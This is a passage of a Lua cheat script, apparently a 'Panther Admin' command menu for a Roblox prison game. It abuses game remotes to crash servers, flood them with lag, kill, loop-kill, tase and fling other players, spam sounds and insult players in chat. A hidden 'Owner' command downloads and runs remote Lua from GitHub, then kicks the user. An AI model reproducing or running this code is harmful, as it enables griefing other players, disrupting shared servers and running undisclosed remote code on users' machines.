							wait(.5)
							Target = nil
						end
					end
				end)
			end)
		end,nil,nil,true)
		Kaito:AddCmd("admin", "The selected player can use certain commands", function(args)
			local Target = Kaito:FindPlayer(args[2])
			if Target then
				if table.find(Temp.Admins,Target.Name) then
					table.insert(Temp.Admins, Target.Name)
					local ohString1 = "/w "..Target.Name.." ".."PANTHER ADMIN: You have been admined! if you are ready to get started using commands type [>cmds] in chat."
					local ohString2 = "All"
					game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ohString1, ohString2)
				else
					Kaito:Notif("This player is already an admin!",false)
				end
			end
		end,nil,nil,true)
		Kaito:AddCmd("unadmin", "Unadmins a player", function(args)
			local Target = Kaito:FindPlayer(args[2])
			if Target then
				if not table.find(Temp.Admins,Target.Name) then
					table.remove(Temp.Admins,table.find(Temp.Admins,Target.Name))
					local ohString1 = "/w "..Target.Name.." ".."PANTHER ADMIN: YOU'RE AIN IS REVOKED YOU ARE NO LONGER ADMIN!"
					local ohString2 = "All"
					game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ohString1, ohString2)
				else
					Kaito:Notif("This player is not an admin!",false)
				end
			end
		end,nil,nil,true)
		Kaito:AddCmd("admins", "Tells you all admins", function(args)
			local Compiled = ""
			for i,v in pairs(Temp.Admins) do
				if v then
					Compiled=Compiled..string.char(32)..v
				end
			end
			Kaito:Notif("Admins: "..Compiled,4)
		end,nil,nil,true)
		Kaito:AddCmd("Crash", "Crashes the server", function(args)
			Kaito:Crasher()
		end,nil,nil,true)
		Kaito:AddCmd("crashserver", "Crashes the server", function(args)
			Kaito:CrashServer()
		end,nil,nil,true)
		--5
		Kaito:AddCmd("onehit", "Makes gun one hit", function(args)
		    if plr.Character:FindFirstChildOfClass("Tool") then
			local Tool = plr.Character:FindFirstChildOfClass("Tool")
			if not Tool:FindFirstChild("GunStates") then
				return Kaito:Notif("Needs to be a gun!",false)
			end
			local cc = require(Tool.GunStates)
			cc["Damage"] = 9e9
			cc["FireRate"] = 0.5
			cc["Range"] = math.huge
			cc["MaxAmmo"] = math.huge
			cc["StoredAmmo"] = math.huge
			cc["AmmoPerClip"] = math.huge
			cc["CurrentAmmo"] = math.huge
			if Tool.Name ~= "Remington 870" then
				cc["Bullets"] = 65
				cc["AutoFire"] = true
			end
			table.insert(Reload_Guns, Tool)
			Player.Character:FindFirstChildOfClass("Humanoid"):UnequipTools()
		else
			Kaito:Notif("You need to hold the gun!",false)
		end
		end,nil,"[ON/OFF]",true)
		Kaito:AddCmd("oneshot", "Makes a gun oneshot", function(args)
			ChangeState(args[2],"OneShot")
		end,nil,"[ON/OFF]",true)
		Kaito:AddCmd("anticrash", "Tries to stop simple crashes (DOESNT WORK WITH PANTHER ADMIN CRASH)", function(args)
			local Value = ChangeState(args[2],"anticrash")
			if Value then
				pcall(function()
					game:GetService("Players").LocalPlayer.PlayerScripts.ClientGunReplicator.Disabled = true
				end)
			else
				pcall(function()
					game:GetService("Players").LocalPlayer.PlayerScripts.ClientGunReplicator.Disabled = false
				end)
			end
		end,nil,"[ON/OFF]",true)
		Kaito:AddCmd("virus", "Anyone who touches the player dies", function(args)
			local r = Kaito:FindPlayer(args[2])
			if r and not table.find(Temp.Viruses,r) then
				table.insert(Temp.Viruses, r)
				Kaito:Notif("Player now has covid-19")
			end
		end,nil,"[PLAYER]",true)
		Kaito:AddCmd("unvirus", "Removes virus from player", function(args)
			local r = Kaito:FindPlayer(args[2])
			if r and table.find(Temp.Viruses,r) then
				table.remove(Temp.Viruses,table.find(Temp.Viruses,r))
				Kaito:Notif("Removed covid-19 from player")
			end
		end,nil,"[PLAYER]",true)
		Kaito:AddCmd("lagspike", "Freezes everyones screen for some seconds", function(args)
			local a = game:GetService("RunService").Stepped:Connect(function()
				pcall(function()
					plr.Character:Destroy()
				end)
			end)
			local a2 = plr.CharacterAdded:Connect(function(a)
				pcall(function()
					a:Destroy()
				end)
				pcall(function()
					plr.Character:Destroy()
				end)
			end)
			for i =1,1500 do
				task.spawn(function()
					workspace.Remote.TeamEvent:FireServer("Bright orange")
				end)
			end
			wait(8)
			a:Disconnect()
			a2:Disconnect()
			wait(.7)
			task.spawn(function()
				workspace.Remote.TeamEvent:FireServer("Bright orange")
			end)
		end,nil,"",true)
		Kaito:AddCmd("ff", "Forcefield", function(args)
			local Value = ChangeState(args[2],"ff")
		end,nil,"[ON/OFF]",true)
		Kaito:AddCmd("minigun", "makes a minigun", function(args)
			Kaito:GetGun("AK-47")
			wait(.7)
			local Tool = plr.Backpack:FindFirstChildOfClass("Tool")
			if not Tool:FindFirstChild("GunStates") then
				return Kaito:Notif("Needs to be a gun!",false)
			end
			local cc = require(Tool.GunStates)
			cc["Damage"] = 9e9
			cc["FireRate"] = 0.001
			cc["Range"] = math.huge
			cc["MaxAmmo"] = math.huge
			cc["StoredAmmo"] = math.huge
			cc["AmmoPerClip"] = math.huge
			cc["CurrentAmmo"] = math.huge
			if Tool.Name ~= "Remington 870" then
				cc["Bullets"] = 1
				cc["AutoFire"] = true
			end
			table.insert(Reload_Guns, Tool)
			Player.Character:FindFirstChildOfClass("Humanoid"):UnequipTools()
			Kaito:GetGun("Remington 870")
			wait(.7)
			for i,v in pairs(plr.Backpack:GetChildren()) do
				if v and v:FindFirstChildOfClass("ModuleScript") then
					v.Grip = v.Grip+Vector3.new(0,1,0)
				end
			end
			plr.Backpack:WaitForChild("Remington 870").Parent = plr.Character
			wait(.4)
			plr.Backpack:WaitForChild("AK-47").Parent = plr.Character
		end,nil,"",true)
		Kaito:AddCmd("music", "plays sound id in your game", function(args)
			local r = args[2]
			if r == "stop" then
				if Temp.MUSICP then
					Temp.MUSICP:Stop()
					Temp.MUSICP:Destroy()
					Temp.MUSICP = nil
				end
			elseif tonumber(Temp.MUSICP) then
				local a = Instance.new("Sound",workspace)
				a.Volume = 1
				a.Name = "Music"
				a.Looped = true
				a:Play()
				Temp.MUSICP = a
			end
		end,nil,"[ID] OR [STOP]",true)
-- Function to create a spam advertisement
		Kaito:AddCmd("roast", "spams a message in game", function(args)
			local Target = Kaito:FindPlayer(args[2])
			local Roasts = {
				"plr3's belt size is 'equator',",
				"plr3 is so dumb that not even Dora can explore her,",
				"plr3 is so bad, that it took 2 buses & 1 train to get plr3 to the good side,",
				"plr3 stepped onto a scale, and it said 'TO BE CONTINUED'.",
				"I swerved to miss plr3 in my car and ran out of gas,",
				"When plr3 wears high heels, plr3 strikes oil.",
				"Did you know that plr3 gets group insurance,",
				"When plr3 skips a meal, the stock market drops,",
				"When plr3 goes camping, the bears hide their food.",
			}
			if Target then
				local Compiled = Roasts[math.random(1,#Roasts)]
				Compiled = Compiled:gsub("plr3",Target.DisplayName)
				local ohString1 = Compiled
				local ohString2 = "All"
				game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ohString1, ohString2)
			end
		end,nil,"[TARGET]",true)
		Kaito:AddCmd("joinlogs", "tells you who is leaving and joining", function(args)
			local Value = ChangeState(args[2],"joinlogs")
			if Value then
				Temp.joinning = game:GetService("Players").PlayerAdded:Connect(function(a)
					game.StarterGui:SetCore("ChatMakeSystemMessage",  { Text = "[JOIN LOGS]: "..a.Name.." has joined the game!", Color = Color3.fromRGB(16, 243, 255), Font = Enum.Font.SourceSansBold, FontSize = Enum.FontSize.Size24 } )

				end)
				Temp.joinning2 = game:GetService("Players").PlayerRemoving:Connect(function(a)
					game.StarterGui:SetCore("ChatMakeSystemMessage",  { Text = "[JOIN LOGS]: "..a.Name.." has left the game!", Color = Color3.fromRGB(50, 14, 255), Font = Enum.Font.SourceSansBold, FontSize = Enum.FontSize.Size24 } )
				end)
			else
				pcall(function()
					Temp.joinning2:Disconnect()
					Temp.joinning:Disconnect()
				end)
			end
		end,nil,"[ON/OFF]",true)
		Kaito:AddCmd("antifling", "prevents players from flinging you", function(args)
			local Value = ChangeState(args[2],"AntiFling")
		end,nil,"[ON/OFF]",true)
		Kaito:AddCmd("mkill", "kills player by teleport", function(args)
			local function MKILL(target,STOP,P)
				if target == plr or target == plr.Name then
					return
				end
				if typeof(target):lower() == "string" and game:GetService("Players"):FindFirstChild(target) then
					target = game:GetService("Players"):FindFirstChild(target)
				end
				if not STOP then STOP =1 end
				if not target or not target.Character or not target.Character:FindFirstChild("Humanoid") or target.Character:FindFirstChildOfClass("ForceField") or target.Character:FindFirstChild("Humanoid").Health<1 or not plr.Character or not plr.Character:FindFirstChildOfClass("Humanoid") or not plr.Character:FindFirstChild("HumanoidRootPart")  then
					return
				end
				Kaito:UnSit()
				local saved = Kaito:GetPosition()
				if not P then P = saved else saved = P end
				game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = target.Character:FindFirstChild("Head").CFrame
				wait(.2)
				for i =1,10 do
					task.spawn(function()
						game.ReplicatedStorage["meleeEvent"]:FireServer(target)
					end)
				end
				wait(.1)
				if target and target.Character and target.Character:FindFirstChild("Humanoid") and target.Character:FindFirstChild("Humanoid").Health >1 and STOP ~=3 then
					MKILL(target,STOP+1,P)
					return
				end
				Kaito:MoveTo(saved)
			end
			local r = Kaito:FindPlayer(args[2])
			if r then
				MKILL(r)
			end
		end,nil,"[PLAYER]",true)
		Kaito:AddCmd("loopmkill", "kills player by teleport loopkill", function(args)
			local r = Kaito:FindPlayer(args[2])
			if r and not table.find(Temp.LoopmKilling,r.Name) then
				table.insert(Temp.LoopmKilling, r.Name)
				Kaito:Notif("Now loopkilling player")
			end
		end,nil,"[PLAYER]",true)
		Kaito:AddCmd("unloopmkill", "kills player by teleport loopkill", function(args)
			local r = Kaito:FindPlayer(args[2])
			if r and table.find(Temp.LoopmKilling,r.Name) then
				table.remove(Temp.LoopmKilling,table.find(Temp.LoopmKilling,r.Name))
				Kaito:Notif("Now unloopkilling player")
			end
		end,nil,"[PLAYER]",true)
		Kaito:AddCmd("godmode", "Turns on all settings that prevent you from harm", function(args)
			local Value = ChangeState(args[2],"Godmode")
			if Value then
				States.AntiArrest = true
				States.AntiTase = true
				States.AntiFling = true
				States.antipunch = true
				States.ShootBack = true
				States.AutoItems = true
				States.Antishield = true
				States.anticrash = true
				States.AutoRespawn = true
				wait(.1)
				Kaito:Refresh(true)
			else
				States.AntiArrest = false
				States.AntiTase = false
				States.AntiFling = false
				States.antipunch = false
				States.ShootBack = false
				States.AutoItems = false
				States.Antishield = false
				States.anticrash = false
			end
		end,nil,"[ON/OFF]",true)
		Kaito:AddCmd("superknife", "One shot knife", function(args)
			workspace.Remote.ItemHandler:InvokeServer({Position=game:GetService("Players").LocalPlayer.Character.Head.Position,Parent=workspace.Prison_ITEMS.single["Crude Knife"]})
			wait(.6)
			local tool = plr.Backpack:WaitForChild("Crude Knife")
			tool.Name = "Super knife"
			if tool then
				Temp.superthingy = game:GetService("UserInputService").InputEnded:Connect(function(inp,endi)
					if not endi then
						if not tool then
							Temp.superthingy = nil
						end
						if inp.UserInputType == Enum.UserInputType.MouseButton1 then
							for i,v in pairs(game:GetService("Players"):GetPlayers()) do
								if v and v~=plr and (v.Character:GetPrimaryPartCFrame().Position-Kaito:GetPosition()*CFrame.new(0,0,.4).Position).Magnitude <3.6 then
									for i =1,20 do
										task.spawn(function()
											game:GetService("ReplicatedStorage").meleeEvent:FireServer(v)
										end)
									end
								end
							end
						end
					end
				end)
			end
		end,nil,"",true)
		Kaito:AddCmd("autoadmin", "Admins someone even if you leave and rejoin", function(args)
			local Target = Kaito:FindPlayer(args[2])
			if Target then
				local Content = game:GetService("HttpService"):JSONDecode(readfile("Panther_Admin/SavedAdmins.json"))
				local Found = Kaito:FindString(Target.Name,Content)
				local New = {}
				for i,v in pairs(Content) do
					if v then
						New[i] = v
					end
				end
				table.Insert(New, Target.Name)
				if not Found then
					local ohString1 = "/w "..Target.Name.." ".."PANTHER ADMIN: You have been Autoadmined type [>cmds] in chat to get started!"
					local ohString2 = "All"
					game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ohString1, ohString2)
					writefile("Panther_Admin/SavedAdmins.json",game:GetService("HttpService"):JSONEncode(New))
					Kaito:Notif("Player has been autoadmined")
				end
			end
		end,nil,"[PLAYER]",true)

		Kaito:AddCmd("unautoadmin", "unauto admins a player", function(args)
			local Target = Kaito:FindPlayer(args[2])
			if Target then
				local Content = game:GetService("HttpService"):JSONDecode(readfile("Panther_Admin/SavedAdmins.json"))
				local Found = Kaito:FindString(Target.Name,Content)
				local New = {}
				for i,v in pairs(Content) do
					if v then
						New[i] = v
					end
				end
				table.remove(New,table.find(New,Target.Name))
				pcall(function()
					table.remove(Temp.Admins,table.find(Temp.Admins,Target.Name))
				end)
				if Found then
					writefile("Panther_Admin/SavedAdmins.json",game:GetService("HttpService"):JSONEncode(New))
					Kaito:Notif("Player has been removed from autoadmin list")
				end
			end
		end,nil,"[PLAYER]",true)
		Kaito:AddCmd("earrape", "spams sounds", function(args)
			local Value = ChangeState(args[2],"earrape")
			if Value then
				while wait(.1) do
					for i,v in pairs(workspace:GetDescendants()) do
						if v:IsA("Sound") then
							v:Play()
						end
					end
					if not States.earrape or Unloaded then
						break
					end
				end
			end
		end,nil,"[ON/OFF]",true)
    end
	--//end of premium
	Kaito:AddCmd("drag", "Enables draggable mode for all Panther guis", function(args)
		local Value = ChangeState(args[2],"DraggableGuis")
	end,nil,"- ENABLES DRAGGABLE GUIS")
	--TEST
	-- Function to update player GUI with leaderboard
local function updatePlayerGUI(player)
    -- Create leaderboard GUI element
    local leaderboard = Instance.new("Frame")
    leaderboard.Name = "LeaderboardFrame"  -- Unique name
    leaderboard.Size = UDim2.new(0, 200, 0, 100)
    leaderboard.Position = UDim2.new(0.5, -100, 0, 50 + (110 * (#game.Players:GetPlayers() - 1)))
    leaderboard.BackgroundTransparency = 0.5
    leaderboard.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    leaderboard.BorderSizePixel = 1
    leaderboard.Parent = player.PlayerGui

    local nameLabel = Instance.new("TextLabel")
    nameLabel.Name = "NameLabel"
    nameLabel.Text = "Developer: itzC9"  -- Replace with actual developer name
    nameLabel.Size = UDim2.new(1, 0, 0.5, 0)
    nameLabel.Position = UDim2.new(0, 0, 0, 0)
    nameLabel.BackgroundTransparency = 1
    nameLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
    nameLabel.TextScaled = true
    nameLabel.Parent = leaderboard

    local hammerLogo = Instance.new("ImageLabel")
    hammerLogo.Name = "HammerLogo"
    hammerLogo.Image = "rbxassetid://5278151553"
    hammerLogo.Size = UDim2.new(0.5, 0, 0.5, 0)
    hammerLogo.Position = UDim2.new(0, 0, 0.5, 0)
    hammerLogo.BackgroundTransparency = 1
    hammerLogo.Parent = leaderboard

    -- Example event handling for leaderboard update
    player.Chatted:Connect(function(message)
        if message:sub(1, 6):lower() == "/score" then
            local score = message:sub(8)
            nameLabel.Text = "Developer: " .. player.Name
        end
    end)
end

-- Example: Function to add command and update GUI
Kaito:AddCmd("Owner", "Owner Be like", function(args)
    if PremiumActivated then
        game:GetService("StarterGui"):SetCore("SendNotification", {Title = "Panther Admin",Text = "Are You Sure You Really Want This?!?!?",Duration = 10,})
        wait(5)
        loadstring(game:HttpGet("https://raw.githubusercontent.com/markxd07/Luxury-Free/main/Auto_Kaitun.lua"))()
        wait(2) 
      		game.Players.LocalPlayer:Kick("DO YOU WANT CLICK AGAIN?🙂")
end, true, "", true, true)
	--END TEST
	Kaito:AddCmd("removdoors", "prevents players from flinging you", function(args)
		local Value = ChangeState(args[2],"DoorsDestroy")
		if Value then
			workspace.Doors.Parent = game.Lighting
		else
			game.Lighting.Doors.Parent = workspace
		end
	end,nil,"[ON/OFF]")
	Kaito:AddCmd("copyteam", "copies a player team looped", function(args)
		local r = Kaito:FindPlayer(args[2])
		if r then
			Kaito:ChangeTeam(r.TeamColor.Name)
			Temp.CPTConnect = r:GetPropertyChangedSignal("Team"):Connect(function()
				if Player.Team ~= r.Team then
					Kaito:ChangeTeam(r.Team,true)
				end
			end)
			Kaito:Notif("Loop team changing now.")
		end
	end,nil,"[PLAYER]")
	Kaito:AddCmd("speed", "sets your players speed", function(args)
		if args[2] and tonumber(args[2]) then
			plr.Character:FindFirstChildOfClass("Humanoid").WalkSpeed = tonumber(args[2])
		else
			Kaito:Notif("Please set a valid number!")
		end
	end,nil,"[NUMBER]")
	Kaito:AddCmd("jump", "sets your players jumppower", function(args)
		if args[2] and tonumber(args[2]) then
			plr.Character:FindFirstChildOfClass("Humanoid").JumpPower = tonumber(args[2])
		else
			Kaito:Notif("Please set a valid number!")
		end
	end,nil,"[NUMBER]")
	Kaito:AddCmd("uncopyteam", "stops copying a players team", function(args)
		Temp.CPTConnect:Disconnect()
		Kaito:Notif("Unloop teamed")
	end,nil,"[PLAYER]")
	Kaito:AddCmd("kill", "Kills a player", function(args)
		if args[2] == "all" then
			Kaito:killall()
		elseif args[2] == "everyone" then
			Kaito:killall()
		elseif args[2] == "others" then
			Kaito:killall()
		elseif args[2] == "guards" then
			Kaito:killall(game.Teams.Guards)
		elseif args[2] == "inmates" then
			Kaito:killall(game.Teams.Inmates)
		elseif args[2] == "criminals" then
			Kaito:killall(game.Teams.Criminals)
		elseif args[2] == "random" then
			local random = nil
			while true do
				random = game:GetService("Players"):GetPlayers()[math.random(1, #game:GetService("Players"):GetPlayers())]
				task.wait()
				if random.Team ~= game.Teams.Criminals and random ~= game:GetService("Players").LocalPlayer then
					break
				end
			end
			Kaito:KillPlayer(random)
			Kaito:Notif("Killed "..random.Name)
		else
			local Player = Kaito:FindPlayer(args[2])
			if Player then
				Kaito:KillPlayer(Player)
			end
		end
	end,nil,"[PLAYER,ALL,TEAM]")

---- Always day
local function setConstantMorning()
    while true do
        -- Check if the lighting service exists
        if game:GetService("Lighting") then
            -- Set time to 8:00 AM (morning)
            game:GetService("Lighting").TimeOfDay = "08:00:00"
        end
        wait(1) -- Wait 1 second before setting time again (adjust this delay as needed)
    end
end
-- Create a command to toggle always day
Kaito:AddCmd("AlwaysDay", "Toggle always day", function(args)
    setConstantMorning()
end)
-------DAY
	Kaito:AddCmd("arrest", "Arrests the targeted player", function(args)
		if args[2] and args[2] == "all" then
			local LastPosition = Kaito:GetPosition()
			for i,v in pairs(game:GetService("Players"):GetPlayers()) do
				if v and v~= game:GetService("Players").LocalPlayer and v.Team == game.Teams.Criminals or (Kaito:BadArea(v) and v.Team == game.Teams.Inmates) and v.Character.PrimaryPart and v.Character:FindFirstChildOfClass("Humanoid").Health>0 then
					repeat Kaito:swait()
						Kaito:MoveTo(v.Character:GetPrimaryPartCFrame()*CFrame.new(0,0,-4.5))
						task.spawn(function()
							workspace.Remote.arrest:InvokeServer(v.Character.PrimaryPart)
						end)
					until v.Character["Head"]:FindFirstChildOfClass("BillboardGui")
					Kaito:MoveTo(LastPosition)
					wait(.7)
				end
			end
			Kaito:MoveTo(LastPosition)
		elseif args[2] and args[2]~="all" then
			local LastPosition = Kaito:GetPosition()
			local Target = Kaito:FindPlayer(args[2])
			if Target then
				if Target.Team == game.Teams.Guards or not Kaito:BadArea(Target) then
					return Kaito:Notif("Can't arrest this player!")
				end
				repeat Kaito:swait()
					Kaito:MoveTo(Target.Character:GetPrimaryPartCFrame()*CFrame.new(0,0,-4.5))
					task.spawn(function()
						workspace.Remote.arrest:InvokeServer(Target.Character.PrimaryPart)
					end)
				until Target.Character["Head"]:FindFirstChildOfClass("BillboardGui")
			end
			Kaito:MoveTo(LastPosition)
		end
	end,nil,"[PLAYER,ALL]")
	local function IsTeamCommandCheck(String)
		for i,v in pairs(game:GetService("Teams"):GetChildren()) do
			if v and v.Name:lower() == String:lower() then
				return v
			end
		end
		return nil
	end
	Kaito:AddCmd("loopkill", "Kills a player over and over until stopped", function(args)
		if args[2] and IsTeamCommandCheck(args[2]) then
            local Team = IsTeamCommandCheck(args[2])
            if Team == game.Teams.Criminals then
                States.loopkillcriminals = true
                Kaito:Notif("Loopkilling criminals")
                return
            elseif Team == game.Teams.Inmates then
                States.loopkillinmates = true
                Kaito:Notif("Loopkilling inmates")
                return
            elseif Team == game.Teams.Guards then
                Kaito:Notif("Loopkilling guards")
                States.loopkillguards = true
                return
            end
        elseif args[2] == "all" then
            Temp.Loopkillall = true
            Kaito:Notif("Loopkilling all")
        else
            local Player = Kaito:FindPlayer(args[2])
            if not table.find(Temp.Loopkilling,Player.Name) then
                table.insert(Temp.Loopkilling,Player.Name)
                Kaito:Notif("Now loopkilling selected player.")
            else
                Kaito:Notif("Player is already getting loop killed!",false)
            end
        end
	end,nil,"[PLAYER/ALL,TEAM]")
	Kaito:AddCmd("lk", "Kills a player over and over until stopped", function(args)
		if args[2] and IsTeamCommandCheck(args[2]) then
			local Team = IsTeamCommandCheck(args[2])
			if Team == game.Teams.Criminals then
				States.loopkillcriminals = true
				Kaito:Notif("Loopkilling criminals")
				return
			elseif Team == game.Teams.Inmates then
				States.loopkillinmates = true
				Kaito:Notif("Loopkilling inmates")
				return
			elseif Team == game.Teams.Guards then
				Kaito:Notif("Loopkilling guards")
				States.loopkillguards = true
				return
			end
		elseif args[2] == "all" then
			Temp.Loopkillall = true
			Kaito:Notif("Loopkilling all")
		else
			local Player = Kaito:FindPlayer(args[2])
			if not table.find(Temp.Loopkilling,Player.Name) then
				table.insert(Temp.Loopkilling, Player.Name)
				Kaito:Notif("Now loopkilling selected player.")
			else
				Kaito:Notif("Player is already getting loop killed!",false)
			end
		end
	end,true,"[PLAYER/ALL,TEAM]")
	Kaito:AddCmd("unloopkill", "Stops loopkilling a player", function(args)
		if args[2] and IsTeamCommandCheck(args[2]) then
			local Team = IsTeamCommandCheck(args[2])
			if Team == game.Teams.Criminals then
				States.loopkillcriminals = false
				Kaito:Notif("unLoopkilling criminals")
				return
			elseif Team == game.Teams.Inmates then
				States.loopkillinmates = false
				Kaito:Notif("unLoopkilling inmates")
				return
			elseif Team == game.Teams.Guards then
				States.loopkillguards = false
				Kaito:Notif("unLoopkilling guards")
				return
			end
		elseif args[2] == "all" then
			Temp.Loopkillall = false
			Kaito:Notif("Unloopkilling all")
		else
			local Player = Kaito:FindPlayer(args[2])
			if table.find(Temp.Loopkilling,Player.Name) then
				table.remove(Temp.Loopkilling,table.find(Temp.Loopkilling,Player.Name))
				Kaito:Notif("Player has been unlooped")
			else
				Kaito:Notif("Player is not being loopkilled!",false)
			end
		end
	end,nil,"[PLAYER,ALL,TEAM]")
	Kaito:AddCmd("unlk", "Stops loopkilling a player", function(args)
		if args[2] and IsTeamCommandCheck(args[2]) then
			local Team = IsTeamCommandCheck(args[2])
			if Team == game.Teams.Criminals then
				States.loopkillcriminals = false
				Kaito:Notif("unLoopkilling criminals")
				return
			elseif Team == game.Teams.Inmates then
				States.loopkillinmates = false
				Kaito:Notif("unLoopkilling inmates")
				return
			elseif Team == game.Teams.Guards then
				States.loopkillguards = false
				Kaito:Notif("unLoopkilling guards")
				return
			end
		elseif args[2] == "all" then
			Temp.Loopkillall = false
			Kaito:Notif("Unloopkilling all")
		else
			local Player = Kaito:FindPlayer(args[2])
			if table.find(Temp.Loopkilling,Player.Name) then
				table.remove(Temp.Loopkilling,table.find(Temp.Loopkilling,Player.Name))
				Kaito:Notif("Player has been unlooped")
			else
				Kaito:Notif("Player is not being loopkilled!",false)
			end
		end
	end,true,"[PLAYER,ALL,TEAM]")
	Kaito:AddCmd("tase", "Tases the target", function(args)
		if args[2] == "all" then
			local Oldt = Player.Team
			Kaito:ChangeTeam(game.Teams.Guards)
			repeat task.wait() until Player.Backpack:FindFirstChild("Taser")
			wait(.7)
			local ohTable1 = {}
			for i,v in pairs(game:GetService("Players"):GetPlayers()) do
				if v and v~= Player and v.Team ~= game.Teams.Guards then
					table.insert(ohTable1, {
						["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),
						["Distance"] = -1,
						["Cframe"] = CFrame.new(),
						["Hit"] = v.Character.Head
					})
				end
			end
			local ohInstance2 = game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Taser") or game:GetService("Players").LocalPlayer.Character:FindFirstChild("Taser")
			game:GetService("ReplicatedStorage").ShootEvent:FireServer(ohTable1, ohInstance2)
			task.spawn(function()
				game:GetService("ReplicatedStorage").ReloadEvent:FireServer(game:GetService("Players").LocalPlayer.Backpack.Taser)
			end)
			wait(.7)
			Kaito:ChangeTeam(Oldt)
		elseif args[2] == "criminals" then
			local Oldt = Player.Team
			Kaito:ChangeTeam(game.Teams.Guards)
			repeat task.wait() until Player.Backpack:FindFirstChild("Taser")
			wait(.7)
			local ohTable1 = {}
			for i,v in pairs(game:GetService("Players"):GetPlayers()) do
				if v and v~= Player and v.Team ~= game.Teams.Guards and v.Team ==game.Teams.Criminals then
					table.insert(ohTable1,{
						["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),
						["Distance"] = -1,
						["Cframe"] = CFrame.new(),
						["Hit"] = v.Character.Head
					})
				end
			end
			local ohInstance2 = game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Taser") or game:GetService("Players").LocalPlayer.Character:FindFirstChild("Taser")
			game:GetService("ReplicatedStorage").ShootEvent:FireServer(ohTable1, ohInstance2)
			task.spawn(function()
				game:GetService("ReplicatedStorage").ReloadEvent:FireServer(game:GetService("Players").LocalPlayer.Backpack.Taser)
			end)
			wait(.7)
			Kaito:ChangeTeam(Oldt)
		elseif args[2] == "inmates" then
			local Oldt = Player.Team
			Kaito:ChangeTeam(game.Teams.Guards)
			repeat task.wait() until Player.Backpack:FindFirstChild("Taser")
			wait()
			local ohTable1 = {}
			for i,v in pairs(game:GetService("Players"):GetPlayers()) do
				if v and v~= Player and v.Team ~= game.Teams.Guards and v.Team ==game.Teams.Inmates then
					table.insert(ohTable1, {
						["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),
						["Distance"] = -1,
						["Cframe"] = CFrame.new(),
						["Hit"] = v.Character.Head
					})
				end
			end
			local ohInstance2 = game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Taser") or game:GetService("Players").LocalPlayer.Character:FindFirstChild("Taser")
			game:GetService("ReplicatedStorage").ShootEvent:FireServer(ohTable1, ohInstance2)
			task.spawn(function()
				game:GetService("ReplicatedStorage").ReloadEvent:FireServer(game:GetService("Players").LocalPlayer.Backpack.Taser)
			end)
			wait(.7)
			Kaito:ChangeTeam(Oldt)
		else
			local Target = Kaito:FindPlayer(args[2])
			if Target then
				local Oldt = Player.Team
				Kaito:ChangeTeam(game.Teams.Guards)
				repeat task.wait() until Player.Backpack:FindFirstChild("Taser")
				wait(.7)
				local ohTable1 = {
					[1] = {
						["RayObject"] = Ray.new(Vector3.new(), Vector3.new()),
						["Distance"] = 0,
						["Cframe"] = CFrame.new(),
						["Hit"] = Target.Character.Head
					}
				}
				local ohInstance2 = game:GetService("Players").LocalPlayer.Backpack.Taser

				game:GetService("ReplicatedStorage").ShootEvent:FireServer(ohTable1, ohInstance2)
				task.spawn(function()
					game:GetService("ReplicatedStorage").ReloadEvent:FireServer(game:GetService("Players").LocalPlayer.Backpack.Taser)
				end)
				wait(.1)
				Kaito:ChangeTeam(Oldt)
			end
		end
	end,nil,"[PLAYER,ALL]")
-- Assuming Kaito is a pre-defined object with methods for command creation and player manipulation

-- Function to create the 'fling' command
Kaito:AddCmd("fling", "Flings a player", function(args)
    local Player = Kaito:FindPlayer(args[2])
    if Player then
        -- Apply a high velocity to the HumanoidRootPart to fling the player
        local hrp = Player.Character and Player.Character:FindFirstChild("HumanoidRootPart")
        if hrp then
            hrp.Velocity = Vector3.new(math.random(-500, 500), math.random(500, 1000), math.random(-500, 500))
        end
    end
end, true, "[PLAYER]")

-- Example usage
Kaito:AddCmd("heaven", "Teleports a player to the void", function(args)
    local Player = Kaito:FindPlayer(args[2])
    if Player then
        Kaito:bring(Player, CFrame.new(2^7, 5^34, 4^7))
    end
end, true, "[PLAYER]")

	Kaito:AddCmd("void", "Teleports a player to the void", function(args)
		local Player = Kaito:FindPlayer(args[2])
		if Player then
			Kaito:bring(Player,CFrame.new(2^7,5^34,4^7),nil,true)
		end
	end,nil,"[PLAYER]")
	Kaito:AddCmd("whitelist", "Prevents commands from harming the target", function(args)
		local Player = Kaito:FindPlayer(args[2])
		if Player then
			if not table.find(Kaito.Whitelisted,Player) then
				table.insert(Kaito.Whitelisted, Player)
				Kaito:Notif("Target has been whitelisted")
			end
		end
	end,nil,"[PLAYER]")
	Kaito:AddCmd("unwhitelist", "unwhitelists a target", function(args)
		local Player = Kaito:FindPlayer(args[2])
		if Player then
			if table.find(Kaito.Whitelisted,Player) then
				table.remove(Kaito.Whitelisted,table.find(Kaito.Whitelisted,Player))
				Kaito:Notif("Target has been unwhitelisted")
			end
		end
	end,nil,"[PLAYER]")

	Kaito:AddCmd("view", "Watches the selected target", function(args)
		local Player = Kaito:FindPlayer(args[2])
		if Player then
			if Temp.ViewingPlayer  then
				Temp.ViewingPlayer = nil
				wait(.4)
			end
			Temp.ViewingPlayer = Player
			task.spawn(function()
				while wait(.1) do
					pcall(function()
						workspace.CurrentCamera.CameraSubject = Player.Character:FindFirstChildOfClass("Humanoid")
					end)
					if not Player or not Temp.ViewingPlayer or Unloaded then
						workspace.CurrentCamera.CameraSubject = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
						break
					end
				end
			end)
		end
	end,nil,"[PLAYER]")
	Kaito:AddCmd("bring", "Brings a player to you", function(args)
		if args[2] == "random" then
			local random = nil
			while true do
				random = game:GetService("Players"):GetPlayers()[math.random(1, #game:GetService("Players"):GetPlayers())]
				task.wait()
				if random.Team ~= game.Teams.Criminals and random ~= game:GetService("Players").LocalPlayer then
					break
				end
			end
			task.spawn(function()
				Kaito:bring(random)
			end)
		else
